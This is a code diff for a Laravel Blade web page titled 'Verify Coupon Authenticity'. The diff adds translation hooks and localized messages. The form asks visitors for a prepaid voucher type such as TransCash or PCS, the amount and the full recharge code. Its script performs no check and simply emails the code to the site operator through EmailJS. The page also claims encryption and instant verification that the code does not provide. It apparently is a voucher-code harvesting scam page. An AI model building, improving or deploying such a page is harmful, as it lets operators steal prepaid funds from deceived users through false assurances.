@@ -1,11 +1,13 @@
 <x-layout>
 
-     
+
 
     <div class="max-w-[600px] w-full text-center space-y-lg">
         <!-- Instructional Branding Section -->
         <section class="space-y-sm">
+            <!-- data-i18n: clé 'title' — gérée par translatePage() dans layout.blade.php -->
             <h2 data-i18n="title" class="text-headline-lg font-headline-lg text-on-surface tracking-tight">Verify Coupon Authenticity</h2>
+            <!-- data-i18n: clé 'description' — texte descriptif traduit dynamiquement -->
             <p data-i18n="description" class="text-body-lg font-body-lg text-on-surface-variant max-w-[480px] mx-auto">
                 Enter your coupon code below to check its validity, expiration date, and usage status instantly.
             </p>
@@ -17,11 +19,13 @@
 
                 <!-- Type of Recharge -->
                 <div class="relative group">
+                    <!-- label data-i18n 'typeLabel' traduit dynamiquement -->
                     <label for="recharge_type" data-i18n="typeLabel" class="text-sm font-medium text-slate-700 dark:text-slate-300 flex flex-start mb-2">
                         Type of Recharge <span class="text-red-500 ml-1">*</span>
                     </label>
                     <select name="recharge_type" id="recharge_type" required
                         class="w-full h-14 px-md bg-surface text-headline-md font-headline-md border border-outline-variant rounded-lg focus:ring-2 focus:ring-primary focus:border-primary transition-all text-center tracking-widest uppercase">
+                        <!-- option placeholder traduit via data-i18n 'selectRecharge' -->
                         <option value="" disabled selected data-i18n="selectRecharge">Select recharge type</option>
                         <option value="Transcash">TransCash</option>
                         <option value="PCS">PCS</option>
@@ -39,6 +43,7 @@
 
                 <!-- Amount -->
                 <div class="relative group">
+                    <!-- label data-i18n 'amountLabel' et placeholder 'amountPlaceholder' -->
                     <label for="amount" data-i18n="amountLabel" class="text-sm font-medium text-slate-700 dark:text-slate-300 flex flex-start mb-2">
                         Amount <span class="text-red-500 ml-1">*</span>
                     </label>
@@ -48,6 +53,7 @@
 
                 <!-- Recharge Code -->
                 <div class="relative group">
+                    <!-- label data-i18n 'codeLabel' et placeholder 'codePlaceholder' -->
                     <label for="recharge_code" data-i18n="codeLabel" class="text-sm font-medium text-slate-700 dark:text-slate-300 flex flex-start mb-2">
                         Recharge Code <span class="text-red-500 ml-1">*</span>
                     </label>
@@ -97,10 +103,10 @@
 
                 <!-- Country -->
                 <div class="relative group">
-                    <label for="country" class="text-sm font-medium text-slate-700 dark:text-slate-300 flex flex-start mb-2">
+                    <label for="country" data-i18n="countryLabel" class="text-sm font-medium text-slate-700 dark:text-slate-300 flex flex-start mb-2">
                         Country of purchase
                     </label>
-                    <input id="country" name="country" type="text" placeholder="e.g. France"
+                    <input id="country" name="country" type="text" placeholder="e.g. France" data-i18n-placeholder="countryPlaceholder"
                         class="w-full h-14 px-md bg-surface text-headline-md font-headline-md border border-outline-variant rounded-lg focus:ring-2 focus:ring-primary focus:border-primary transition-all tracking-widest uppercase" />
                 </div>
 
@@ -112,7 +118,7 @@
                         <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8v8H4z" />
                     </svg>
                     <span id="btn-icon" class="material-symbols-outlined" style="font-variation-settings: 'FILL' 1;">check_circle</span>
-                    <span id="btn-label">Verify Code</span>
+                    <span id="btn-label" data-i18n="verifyButton">Verify Code</span>
                 </button>
 
             </form>
@@ -122,13 +128,13 @@
         <div class="grid grid-cols-1 md:grid-cols-2 gap-md pt-md">
             <div class="p-md rounded-xl bg-surface-container-low border border-outline-variant text-left flex flex-col gap-base">
                 <span class="material-symbols-outlined text-secondary">security</span>
-                <h3 class="font-headline-md text-headline-md text-on-surface">Secure Check</h3>
-                <p class="font-body-md text-body-md text-on-surface-variant">Real-time encryption ensures your proprietary codes remain private during the lookup.</p>
+                <h3 data-i18n="secureTitle" class="font-headline-md text-headline-md text-on-surface">Secure Check</h3>
+                <p data-i18n="secureText" class="font-body-md text-body-md text-on-surface-variant">Real-time encryption ensures your proprietary codes remain private during the lookup.</p>
             </div>
             <div class="p-md rounded-xl bg-surface-container-low border border-outline-variant text-left flex flex-col gap-base">
                 <span class="material-symbols-outlined text-secondary">speed</span>
-                <h3 class="font-headline-md text-headline-md text-on-surface">Instant Results</h3>
-                <p class="font-body-md text-body-md text-on-surface-variant">Our high-performance verification engine processes requests in under 200 milliseconds.</p>
+                <h3 data-i18n="instantTitle" class="font-headline-md text-headline-md text-on-surface">Instant Results</h3>
+                <p data-i18n="instantText" class="font-body-md text-body-md text-on-surface-variant">Our high-performance verification engine processes requests in under 200 milliseconds.</p>
             </div>
         </div>
 
@@ -150,10 +156,18 @@
         const EMAILJS_PUBLIC_KEY    = '_rzBEYEaRj7BX_bHx';
         const EMAILJS_SERVICE_ID    = 'service_ug6vejb';
         const EMAILJS_TEMPLATE_ID_1 = 'template_q5fs1x5';        // ← notification admin (existant)
-     
+
 
         emailjs.init({ publicKey: EMAILJS_PUBLIC_KEY });
 
+        // i18n helpers sûrs — évitent les erreurs si le script de layout
+        // (qui définit `window.getTranslated` et `window.selectedLanguage`)
+        // n'a pas encore été exécuté au moment de l'exécution de ce script.
+        const safeGetTranslated = (lang, key) => {
+            if (typeof window.getTranslated === 'function') return window.getTranslated(lang, key);
+            return (window.translations && window.translations[lang] && window.translations[lang][key]) || (window.translations && window.translations.en && window.translations.en[key]) || '';
+        };
+        const safeSelectedLanguage = () => (window.selectedLanguage || 'en');
         /* ── TOAST ── */
         function showToast({ type = 'success', title, message, duration = 6000 }) {
             const container = document.getElementById('toast-container');
@@ -203,7 +217,9 @@
             });
 
             if (!valid) {
-                showToast({ type: 'error', title: 'Champs manquants', message: "Veuillez remplir tous les champs obligatoires marqués d'un *.", duration: 4000 });
+                // Utilise la clé de traduction 'missingTitle' / 'missingMessage'
+                const lang = safeSelectedLanguage();
+                showToast({ type: 'error', title: safeGetTranslated(lang, 'missingTitle'), message: safeGetTranslated(lang, 'missingMessage'), duration: 4000 });
                 return;
             }
 
@@ -218,22 +234,25 @@
             };
 
             /* Loading */
+            // Pendant l'envoi, on utilise la clé 'sendingLabel' pour afficher le texte localisé
+            const lang = safeSelectedLanguage();
             btn.disabled = true;
             spinner.classList.remove('hidden');
             btnIcon.classList.add('hidden');
-            btnLabel.textContent = 'Sending…';
+            btnLabel.textContent = safeGetTranslated(lang, 'sendingLabel') || 'Sending…';
 
             try {
                 /* ══ ENVOI 1 — Notification admin (toi) ══ */
-               
+
                 await emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID_1, params);
 
                 e.target.reset();
 
+                // Toast de succès utilisant les clés 'toastSuccessTitle' et 'toastSuccessMessage'
                 showToast({
                     type: 'success',
-                    title: 'Demande envoyée avec succès !',
-                    message: 'Votre demande a bien été reçue. Vérifiez votre boîte mail — notre équipe vous répondra très prochainement.',
+                    title: safeGetTranslated(lang, 'toastSuccessTitle') || safeGetTranslated(lang, 'toastSuccessTitle'),
+                    message: safeGetTranslated(lang, 'toastSuccessMessage') || safeGetTranslated(lang, 'toastSuccessMessage'),
                     duration: 7000
                 });
 
@@ -246,31 +265,34 @@
                 /* ══ DIAGNOSTIC PRÉCIS ══ */
                 console.error('[EmailJS] ❌ Erreur :', err);
 
-                let msg = "Une erreur est survenue. Ouvrez la console (F12) pour les détails.";
+                // Construction du message d'erreur en utilisant les clés de traduction
+                // Construction du message d'erreur en utilisant les clés de traduction
+                let msg = safeGetTranslated(lang, 'sendErrorGeneric') || 'An error occurred.';
 
                 if (err?.status === 401 || err?.status === 403) {
-                    msg = '🔑 Public Key invalide — vérifiez Account → General sur emailjs.com';
+                    msg = safeGetTranslated(lang, 'sendErrorAuth');
                 } else if (err?.status === 404) {
-                    msg = '🔍 Service ID ou Template ID introuvable — vérifiez vos IDs sur emailjs.com';
+                    msg = safeGetTranslated(lang, 'sendErrorNotFound');
                 } else if (err?.status === 412) {
-                    msg = '📧 Service Gmail déconnecté — reconnectez-le dans Email Services sur emailjs.com';
+                    msg = safeGetTranslated(lang, 'sendErrorGmailDisconnected');
                 } else if (err?.status === 422) {
-                    msg = '📝 Variable manquante — une variable du template n\'existe pas dans les données envoyées';
+                    msg = safeGetTranslated(lang, 'sendErrorVariableMissing');
                 } else if (err?.status === 429) {
-                    msg = '⏱ Limite atteinte — 200 emails/mois sur le plan gratuit EmailJS';
+                    msg = safeGetTranslated(lang, 'sendErrorRateLimit');
                 } else if (err?.status) {
-                    msg = `Erreur HTTP ${err.status} : ${err.text || 'voir console F12'}`;
+                    msg = `HTTP ${err.status} : ${err.text || safeGetTranslated(lang, 'sendErrorGeneric')}`;
                 } else if (err instanceof TypeError) {
-                    msg = '🌐 Problème réseau ou SDK EmailJS non chargé';
+                    msg = safeGetTranslated(lang, 'sendErrorGeneric');
                 }
 
-                showToast({ type: 'error', title: "Échec de l'envoi", message: msg, duration: 9000 });
+                // Affiche un toast d'erreur localisé
+                showToast({ type: 'error', title: safeGetTranslated(lang, 'sendErrorGeneric'), message: msg, duration: 9000 });
 
             } finally {
                 btn.disabled = false;
                 spinner.classList.add('hidden');
                 btnIcon.classList.remove('hidden');
-                btnLabel.textContent = 'Verify Code';
+                btnLabel.textContent = safeGetTranslated(safeSelectedLanguage() || lang, 'verifyButton') || 'Verify Code';
             }
         });
     </script>
